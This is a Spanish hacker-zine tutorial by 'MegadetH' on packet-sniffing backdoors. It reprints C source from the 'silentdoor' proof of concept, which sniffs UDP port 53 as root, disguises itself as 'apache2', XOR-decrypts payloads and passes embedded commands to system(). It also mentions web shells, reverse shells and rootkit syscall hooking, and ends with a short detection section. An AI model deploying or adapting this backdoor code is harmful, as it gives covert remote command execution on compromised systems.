@@ -1,0 +1,351 @@
+------------------------
+-=Las nuevas backdoors=-
+-(introduccion rapida)-	     
+     by MegadetH
+------------------------
+
+Este documento trata de introducir brevemente al lector sobre las nuevas
+tecnicas usadas para las "backdoors" o puertas traseras, en concreto sobre las
+llamadas de "sniffer".
+
+Documento bajo licencia GFDL
+http://www.fsf.org/licenses/licenses.es.html
+
+El documento esta sin acentos y a 80 caracteres por linea (formato) xD
+
+------------------------
+--Contenidos--
+------------------------
+0x01   intro
+0x02   autor
+0x03   sniffer backdoors
+0x03-1 silentdoor : ejemplo simple
+0x04   deteccion
+0x05   conclusion
+0x06   referencias
+
+nivel : newbie - middle
+
+
+
+0x01 -Intro-
+-------------
+
+Como en todos los aspectos y terrenos de la informatica, todo tiene que ir
+evolucionando y adaptandose a los cambios de los nuevos sistemas, incluidas
+las herramientas y tecnicas usadas por los hackers, administradores de
+sistemas y personal de seguridad. Un claro ejemplo son los rootkits para Linux,
+que sufrieron algunos cambios importantes en el paso del kernel 2.4.x al 2.6.x,
+inicialmente los primeros LKM rootkits lo que hacian era modificar el
+contenido de la sys_call_table, de forma que las syscalls interesantes eran
+redireccionadas a nuestro codigo inyectado en la memoria mediante el LKM.
+En los kernels v2.6 el valor de la sys_call_table ya no se exporta como simbolo
+del kernel. Antes en v2.4 para obtener la direccion de la sys_call_table
+bastaba con algo como:
+
+extern void *sys_call_table[];
+
+En v2.6 la cosa es un poco mas complicada. Hay varios metodos para conseguir
+la direccion de la tabla de syscalls.Uno de ellos consiste en sacar la 
+direccion del propio handler que linux usa para la funcion sysenter_entry.
+(ya no se usa int 0x80 para llamar a las syscalls, sino que se usa una
+instruccion especial llamada 'sysenter'), que lo que hace es llamar a la 
+funcion 'sysenter_entry') para ello sacamos la direccion de sysenter_entry que
+a diferencia de sys_call_table, si que esta exportado como simbolo, visto esto
+"solo" tenemos que modificar el handler.
+/*(thks Raise www.enye-sec.com)*/
+
+No se quedan atras las famosas puertas traseras, que todos hemos usado alguna 
+vez para dejar abierto el acceso a un sistema, la continua evolucion de los
+sistemas y de las herramientas de seguridad hace que tenga que recurrirse a 
+nuevas ideas. (luego lo veremos)....
+Un ejemplo son los accesos via web, en plena eclosion de los servicios via
+web y de tecnicas como XML HTTP Request o AJAX, surgen herramientas de acceso
+via web como PHPremoteshell, que ocultandolo y asignandole los permisos que
+necesita, permite el acceso desde cualquier navegador web sin tener que 
+instalar ninguna herramienta (evidentemente la victima tiene que correr un 
+servicio web con soporte php), es ideal porque el firewall normalmente permite
+el trafico al puerto 80 (si se ofrece servicio web), e incluso hay herramientas
+para hacer conexiones reversas, ¿os acordais del reverse telnet o reverse 
+shell?, pues mucho mas comodo, el "reverseWWWtunnel" de Van Hauser es una de 
+ellas, tambien las hay capaces de mandar comandos a un servidor web externo,
+cosa que pasaria por los firewalls y proxies de salida sin problemas,con lo 
+cual es mas dificil aun de ser detectado.
+
+0x02 -El autor-
+---------------
+
+Voy a hacer un parentesis tras la intro, para comentaros quien soy y de donde
+cojones he salido, bueno, segun quien lea el texto puedo ser una persona u 
+otra, tras varios años descolgado de la parte activa de la seguridad (los años
+,la familia, el curro....) y tras mucho tiempo sin escribir nada de nada,
+desde los tiempos del Netsearch ezine, ultimamente estoy sacando un poco de
+tiempo y me estoy intentando poner al dia de nuevo en estos temas, porque como
+todo, uno pierde nivel rapidamente y se queda obsoleto como las maquinas y
+los sistemas. Para los que me conozcais de epocas anteriores que sepais que me
+acuerdo de vosotros muchas veces (p0pe, sp4rk, dark_fear, Quasar, Chui, 
+Hardcode, Raise, caf0,       ...) Para los que me conozcais como ingeniero de
+sistemas (curro) pues que sepais que llevo alguno años en el mundo del 
+"underground" y de la seguridad y no soy consultor CISA xDDDDDDDDDDDDD (menudo
+cuento sacaperras) especial saludo para Guzman y Anibal, SysOps de un grupo
+inmobiliario, a Guzman en especial le dedico el formato del documento xDDD.
+Este documento es muy breve y no aporta codigo escrito por mi, pero para estar
+6 años oxidado ya es un comienzo....espero que lo aguanteis lo mejor posible 
+porque aunque no os sirva para una mierda (uys perdon) hasta que no arregle el
+codigo del silentdoor, cosa que de momento no estoy haciendo porque retrasare
+esto 10 meses, sirve para ver si me animo y sigo en la linea ascendente y no 
+como hasta ahora.....;))
+
+desde aqui os saludo a tod@s ;)))))
+
+MegadetH
+great.mega@gmail.com
+
+
+0x03 -Sniffers Backdoors-
+-------------------------
+
+Hay una nueva generacion de backdoors que funcionan rastreando todo el trafico
+de red de una interfaz de manera similar a un sniffer normal, pero respondiendo
+a un tipo determinado de paquetes, estos programas ademas suelen incorporar 
+algun tipo de cifrado para complicar aun mas la deteccion del trafico, suelen 
+estar programados usando las famosas y manidas libpcap, y a groso modo su 
+funcionamiento es el siguiente :
+
+-Corren camuflados o simulando otro servicio
+-no abren puertos permanentemente
+-Rastrean todo el trafico de una interfaz
+-usan cifrado
+-Buscan cierto tipo de paquetes 
+-cuando los encuentrar los descifran
+-comprueban que tiene comandos para ellos
+-ejecutan los comandos
+-la respuesta la devuelven con IP spoofing
+
+Esto, como se puede ver, no es lo mismo que dejar un netcat corriendo en un 
+puerto alto ¿eh? xDDDDDDD
+
+/*naturalmente la mayoria de estos programas corren como root o SUID root, pero
+se supone que ya tenemos la maquina ¿no? xDDDD, no voy a entrar en ese detalle,
+ya que no entro en como se ha obtenido acceso a la maquina y una rootshell, se
+puede abusar de programas SUID, explotar un overflow...etc etc etc  xDDDDDDD.
+Esto tambien denota que la seguridad de la maquina y el perimetro ha fallado
+miserablemente*/
+
+
+0x03-1 -Silentdoor-
+-------------------
+
+Vamos a ver el tema con el "silentdoor", ya que es un ejemplo bastante simple
+y facil de entender, y ademas el codigo no esta acabado ni perfeccionado,
+aunque demuestra el POC.
+Silendoor es un ejemplo simple de un proyecto sobre como se puede crear una
+backdoor de tipo sniffer, usando cifrado, y que escucha en el puerto 53,
+camuflandose como otro proceso
+
+Pegas :
+-no esconde el proceso si no que lo camufla como "apache2"
+-el cifrado que usa es pobre (XOR)
+-el codigo tb es pobre y mejorable (ya sabeis....)
+ p.e. el original falla y segun el comando ejecutado pierdes el control
+      el original hace un eco en la pantalla del sistema remoto (desastroso)
+      denota falta de control de errores 
+
+Ventajas :
+-No abre ningun puerto, si no que captura trafico y responde cuando debe 
+
+El programa consta de 3 apartados basicamente, siendo los mas importantes los
+que capturan el trafico y los que interpretan los comandos (esta basado en
+las libpcap y las libnet)
+
+Comentamos por encima :
+
+La función main, se encarga de cambiar el nombre al programa de manera un
+poco cutre (hay una macro definida al principio), y de llamar a la funcion
+catchpacket(), ah y tambien usa las funciones setuid y setgid, lo cual puede
+ser otro inconveniente....
+
+int main(int argc, char *argv[])
+{
+	int x;
+	strcpy(argv[0], BASENAME);
+	setuid(0);
+	setgid(0);
+	x=catchpacket();	
+	return (0);
+}
+
+
+La funcion catchpacket() se encarga de capturar los paquetes, como veis el 
+trabajo pesado lo realizan las libpcap, como cosa interesante el bucle que
+captura paquetes y los pasa al handler para su proceso....
+
+
+int catchpacket(void )
+{
+	char errbuf[PCAP_ERRBUF_SIZE];
+	char filter_string[]="udp port 53";  /*este es el filtro*/
+	pcap_t *sniff_session;
+	struct pcap_pkthdr pkt_head;
+	struct bpf_program filter;
+	const char *payload;
+	u_char *packet;
+	int pkt_adlen;
+	u_char *p_info;
+	bpf_u_int32 mask;
+	bpf_u_int32 net;
+
+	if (-1 == pcap_lookupnet(NULL, &net, &mask, errbuf))
+	    /* interfaz de red */
+           
+	{
+		printf("\n<\n");
+		exit(0);
+	}
+
+	if ((sniff_session=pcap_open_live(NULL, BUFSIZ, 1, 0, errbuf))==NULL)
+	    /* antes del bucle de captura se obtiene un descriptor de 
+               tipo pcap_t, se configura cualquier interfaz para la
+	       captura, num max BUFSIZ y modo promiscuo*/         
+   
+	{
+
+		printf("\n<\n");
+		exit(0);
+	}		
+	pcap_compile(sniff_session, &filter, filter_string, 0, net);
+	pcap_setfilter(sniff_session, &filter);
+	/* compilar y aplicar el filtro de paquetes, si alguien esta
+	interesado en los mecanismos BPF o LSF puede mandarme un mail*/
+
+	pcap_loop(sniff_session, 0, in_pkt, 0);	
+        /*aqui se le pasan los datos del bucle de captura al handler*/ 
+
+	return(0);
+}
+
+
+La funcion in_pkt es el handler encargado de procesar los paquetes, 
+descifrarlos y buscar la password, se invoca para cada paquete recibido ... :
+
+void in_pkt(u_char *other_stuff, const struct pcap_pkthdr* pkt_head, const 
+u_char* packet)
+{
+	int i, x, v;
+	char *ptr1, *ptr2, *ptr3;
+	char pktstore[1024];
+	char tempbuf[1024];
+	char decrypts[1024];
+
+	memset(tempbuf, '\0', sizeof(tempbuf));
+	memset(pktstore, '\0', sizeof(pktstore));
+	memset(decrypts, '\0', sizeof(decrypts));
+	/* rellena de terminaciones para las strings */
+	
+	v = (pkt_head->caplen - 44);
+
+	memcpy(pktstore, packet+44,  (v=(v < (sizeof(pktstore)-1)?v:(sizeof(pkt
+store)-1))));
+        /*saltamos al payload del paquete*/	
+	/* evitar overflow */
+
+	for (i = 0; i <= (v+(v%4)); i+=4) 
+		strncat(tempbuf, PASS, 4);
+	for (i = 0; i < v; ++i)
+	{
+		decrypts[i]=(pktstore[i] ^ tempbuf[i]);
+	} 
+        /* descifrado */
+
+	if (NULL != (ptr1=strstr(decrypts, "-dc$")))
+	    
+	{
+		if (NULL != (ptr2=strstr(ptr1, "$dc")))
+		{
+			memset(tempbuf, '\0', sizeof(tempbuf));
+			strncpy(tempbuf, ptr1+4, (ptr2 - (ptr1 + 4)));	
+			system(tempbuf);
+		 /*localiza y pasa el comando a ejecutar*/ 
+
+		}	
+	}
+
+}
+
+
+Bien, la idea es buena y el concepto es el correcto, como veis no es nada
+complicado con la ayuda de las librerias comentadas.........el codigo segun
+el autor no esta acabado ni depurado.-
+
+Hay otro programa en el mismo estilo pero mucho mas completo, se trata del
+safebreaker, la idea es la misma, pero mejora en lo siguiente :
+
+-No depende de las libpcap
+-Usa las GNUTLS para el cifrado (no el flojito XOR)
+-Hace una comprobacion exhaustiva de los paquetes para captar los destinados a
+ el
+-No bloquea ni abre ningun puerto hasta las conexiones
+-Funciona de 2 maneras : abriendo un PTTY en el puerto especificado o haciendo
+ una conexion reversa al cliente (esto evita muchos firewalls).
+
+El codigo es mas completo, esta mejor programado y es mas largo de analizar,
+quizas escriba una segunda parte con ideas y codigo para mejorar el silentdoor
+y un analisis del safebreaker aunque no prometo nada porque se me avecina algo
+de currele...(o por lo menos eso espero xDDD)
+
+
+0x04 -Deteccion-
+----------------
+
+La deteccion de este tipo de backdoors es un poco dificil, naturalmente si ya
+lo tenemos en nuestra maquina es porque ha fallado la seguridad fundamental
+y alguien ha conseguido entrar y probablemente escalar privilegios, no entro
+ahora a describir que metodos tenemos de defensa y ataque, pero puede que sea
+mas facil descubrir rastro de la penetracion y la instalacion, realmente este
+tipo de sniffer backdoors solamente puede detectarse analizando el trafico de
+red con un sniffer, bueno en el caso del silentdoor pues a lo mejor nos damos
+cuenta de que el apache esta corriendo sin haberlo montado xDDD, pero por lo 
+general analizando el trafico podemos descubrir paquetes con payload cifrado,
+patrones repetitivos en los paquetes, numeros de secuencia iguales, trafico
+eventual en puertos que no tenemos abiertos, podemos usar los clasicos 
+tcpdump, iptraf, wireshark (ethereal)...por ejemplo en el caso del silentdoor
+los paquetes "malos" con destino al puerto 53 se distinguen bastante bien......
+
+
+0x05 -Conclusion-
+-----------------
+
+La seguridad de los sistemas es un asunto vital y muy importante, empezando por
+la seguridad perimetral, cada vez se tiene mas conciencia de ello, los servers
+que no tienen sistemas de defensa y que no se controlan (parches, logs, 
+archivos etc etc) suelen acabar siendo comprometidos y a menudo usados para
+ataques de cualquier tipo a terceros. Es recomendable el uso regular de
+herramientas como tripwire, lsof, nmap e incluso las que se suelen instalar
+con el sistema operativo como ps, netstat, diff... etc etc.
+
+Bueno no os doy mas la vara........salud para tod@s....
+
+MegadetH
+
+
+0x06 -Referencias-
+------------------
+www.packetstormsecurity.nl
+
+www.linux.org
+
+www.kernel.org
+
+Oreilly's
+Undestanding the linux kernel series
+www.oreilly.com
+
+Libros de Richard Stevens
+www.kohala.com/start/
+
+http://www.tcpdump.org/
+
+drraid@gmail.com (silentdoor original author)
+
+great.mega@gmail.com (yo mismo)
+
